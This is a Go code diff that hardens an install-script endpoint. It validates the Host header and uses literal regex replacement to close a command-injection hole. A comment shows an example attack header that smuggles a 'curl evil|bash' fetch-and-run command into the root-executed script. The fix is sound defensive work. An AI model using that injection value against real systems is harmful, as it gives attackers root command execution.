@@ -3,10 +3,12 @@ package master
 import (
 	_ "embed"
 	"fmt"
+	"net"
 	"net/http"
 	"os"
 	"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 
 	"work-v/internal/master/api"
@@ -204,7 +206,14 @@ func handleAgentInstallScript(c *gin.Context) {
 	if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
 		scheme = "https"
 	}
-	host := c.Request.Host
+	// Host 头完全由客户端控制, 必须严格校验后才能拼进"即将以 root 执行"的安装脚本。
+	// 历史实现直接 sprintf 且使用 ReplaceAllString (会把 $1 当捕获组解析),
+	// 构造 Host: a.com";curl evil|bash;# 即可把任意命令注入脚本。
+	host, ok := sanitizeHost(c.Request.Host)
+	if !ok {
+		c.String(http.StatusBadRequest, "Invalid Host header")
+		return
+	}
 	masterURL := fmt.Sprintf("%s://%s", scheme, host)
 
 	// 优先使用配置的外网主控域名
@@ -232,10 +241,47 @@ func handleAgentInstallScript(c *gin.Context) {
 
 	// 动态注入主控端地址
 	re := regexp.MustCompile(`DEFAULT_SERVER="[^"]*"`)
-	script = re.ReplaceAllString(script, fmt.Sprintf(`DEFAULT_SERVER="%s"`, masterURL))
+	// 必须使用 Literal 版本: ReplaceAllString 会把替换串里的 $1/${name} 当作捕获组展开
+	script = re.ReplaceAllLiteralString(script, fmt.Sprintf(`DEFAULT_SERVER="%s"`, masterURL))
 
 	c.Header("Content-Type", "text/plain; charset=utf-8")
 	c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
 	c.String(http.StatusOK, script)
 }
 
+// sanitizeHost 校验并规范化 Host 头 (host[:port])。
+// 只接受合法域名或 IP 与数字端口, 引号/分号/$/空白/斜杠等一律拒绝。
+func sanitizeHost(raw string) (string, bool) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" || len(raw) > 255 {
+		return "", false
+	}
+
+	host, port := raw, ""
+	if h, p, err := net.SplitHostPort(raw); err == nil {
+		host, port = h, p
+	}
+	host = strings.Trim(host, "[]") // IPv6
+	if host == "" {
+		return "", false
+	}
+
+	if net.ParseIP(host) == nil {
+		for _, ch := range host {
+			isAlnum := (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')
+			if isAlnum || ch == '.' || ch == '-' || ch == '_' {
+				continue
+			}
+			return "", false
+		}
+	}
+
+	if port != "" {
+		n, err := strconv.Atoi(port)
+		if err != nil || n < 1 || n > 65535 {
+			return "", false
+		}
+		return net.JoinHostPort(host, port), true
+	}
+	return host, true
+}
